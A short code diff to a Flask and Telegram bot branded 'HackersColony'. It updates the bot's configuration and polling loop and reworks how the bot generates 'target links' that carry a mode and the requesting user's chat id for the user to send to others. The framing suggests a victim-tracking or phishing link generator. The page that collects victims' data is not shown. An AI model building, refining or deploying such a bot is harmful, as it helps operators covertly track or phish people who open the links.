@@ -4,10 +4,11 @@ from telebot import types
 
 app = Flask(__name__)
 
+# Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMINS = [518067190, 7162565886]
 TG_CHANNEL = "https://t.me/HackersColony"
-YT_LINK = "https://youtube.com/@HackersColony"
+YT_LINK = "https://youtube.com/@hackers_colony_tech?si=W2r1_Su7wPvnfy2u" # Your Link Updated
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -67,8 +68,10 @@ def callback_query(call):
 
     elif "m_" in call.data:
         mode = call.data.replace("m_", "")
-        # Link generation fixed with correct host request
-        target_link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
+        # Robust link generation for Render
+        app_url = request.host_url.rstrip('/')
+        target_link = f"{app_url}/?m={mode}&uid={call.message.chat.id}"
+        
         response_text = (
             f"🤠 It's your target link 🔗\n\n"
             f"Url = ( {target_link} )\n\n"
@@ -100,7 +103,7 @@ if __name__ == "__main__":
     def run_bot():
         while True:
             try: bot.polling(none_stop=True)
-            except: time.sleep(10)
+            except: time.sleep(5)
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
     
